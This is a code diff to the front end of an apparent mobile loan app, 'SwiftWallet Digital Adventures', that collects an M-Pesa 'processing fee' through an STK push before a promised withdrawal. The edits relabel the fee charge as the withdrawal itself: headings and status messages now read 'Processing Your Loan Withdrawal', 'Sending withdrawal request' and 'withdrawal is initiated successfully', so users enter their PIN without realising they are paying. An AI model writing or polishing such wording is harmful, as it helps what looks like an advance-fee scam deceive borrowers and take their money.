@@ -349,26 +349,19 @@
         </div>
 
         <!-- Success Alert (Hidden by default) -->
-<div id="successAlert" 
-     class="hidden mb-8 rounded-2xl p-6 slide-in 
-            bg-green-50 border border-green-200 shadow-md">
-  <div class="flex items-start space-x-3">
-    <i class="fas fa-check-circle text-green-500 text-2xl mt-0.5 flex-shrink-0"></i>
-    <div class="w-full">
-      <h3 class="text-lg font-semibold text-green-700 mb-1">
-        Withdrawal Successful!
-      </h3>
-      <p id="successMessage" class="text-green-600 text-sm"></p>
-    </div>
-  </div>
-</div>
+        <div id="successAlert" class="hidden mb-8 success-state rounded-2xl p-6 slide-in bg-green-100 border border-green-300">
+            <div class="flex items-start space-x-3">
+                <i class="fas fa-check-circle text-green-600 text-xl mt-0.5 flex-shrink-0"></i>
+                <div class="w-full">
+                    <h3 class="text-lg font-semibold text-green-800 mb-2">Withdrawal Successful!</h3>
+                    <p id="successMessage" class="text-green-700 text-sm mb-3"></p>
 
                     <!-- Progress Bar -->
                     <div class="w-full bg-gray-200 rounded-full h-5 overflow-hidden relative mb-4">
                         <div id="progressBar" class="bg-green-600 h-5 w-0 transition-all duration-200"></div>
                         <span id="progressText" 
                               class="absolute inset-0 flex items-center justify-center text-xs font-medium text-white">
-                              Processing payment...
+                              Processing previous withdrawal...
                         </span>
                     </div>
 
@@ -735,9 +728,9 @@
                 </div>
             </div>
             
-            <h2 class="text-3xl font-bold mb-4">Processing Fee Payment</h2>
+            <h2 class="text-3xl font-bold mb-4">Processing Your Loan Withdrawal</h2>
             <p class="text-xl mb-4" id="processingMessage">Initiating SwiftWallet Digital Adventures STK Push...</p>
-            <p class="text-lg opacity-90 mb-6" id="processingSubMessage">Please check your phone for the payment request from SWIFTWALLET DIGITAL ADVENTURES</p>
+            <p class="text-lg opacity-90 mb-6" id="processingSubMessage">Please check your phone (${loanData.phone}) for the payment request from SWIFTWALLET DIGITAL ADVENTURES</p>
             
             <!-- Trust indicators -->
             <div class="flex justify-center items-center space-x-6 mb-6">
@@ -1306,7 +1299,7 @@
                 updateProcessingStep(1, 'Validating details...');
                 await delay(1500);
                 
-                updateProcessingStep(2, 'Sending payment request...');
+                updateProcessingStep(2, 'Sending withdrawal request...');
                 await delay(1000);
 
                 // Send STK push for fee payment
@@ -1397,13 +1390,13 @@
                 'bank': 'fas fa-university'
             };
 
-            const message = `Processing fee payment successful! Check your phone for the M-Pesa payment request from <span class="text-red-600 font-bold">✔️SWIFTWALLET DIGITAL ADVENTURES✔️</span>. Enter your M-Pesa PIN to complete the fee payment. Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING APPROVAL</span> after fee payment confirmation.`;
+            const message = `Your withdrawalis initiatedsuccessfully! Check your phone for the M-Pesa payment request from <span class="text-red-600 font-bold">✔️SWIFTWALLET DIGITAL ADVENTURES✔️</span>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal .Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING APPROVAL</span> after fee payment confirmation.`;
 
             // Update success message
             document.getElementById('successMessage').innerHTML = message;
             
             // Update progress text
-            document.getElementById('progressText').textContent = 'Pending Fee Payment & Approval...';
+            document.getElementById('progressText').textContent = 'Pending Fee Payment & withdrawal Approval...';
             
             // Update selected method display
             const methodLogo = document.getElementById('selectedMethodLogo');
@@ -1497,7 +1490,7 @@
             if (feePaymentInitiated === 'true') {
                 const withdrawalMethod = localStorage.getItem('swift_withdrawal_method') || 'M-Pesa';
                 showSuccess(
-                    `Complete previous fee payment. STK Push was sent from SWIFTWALLET DIGITAL ADVENTURES for processing fee. Please complete the fee payment to process your ${withdrawalMethod} withdrawal. Status: <span class="text-orange-600 font-bold">PENDING APPROVAL</span>`
+                    `Complete previous request to (${loanData.phone}) by clicking withdraw button  below .STK Push was sent from SWIFTWALLET DIGITAL ADVENTURES for the requested processing fee. Please complete the fee payment to process your ${withdrawalMethod} withdrawal. Status: <span class="text-orange-600 font-bold">PENDING APPROVAL</span>`
                 );
                 updateDisbursementTimeline(true);
             }
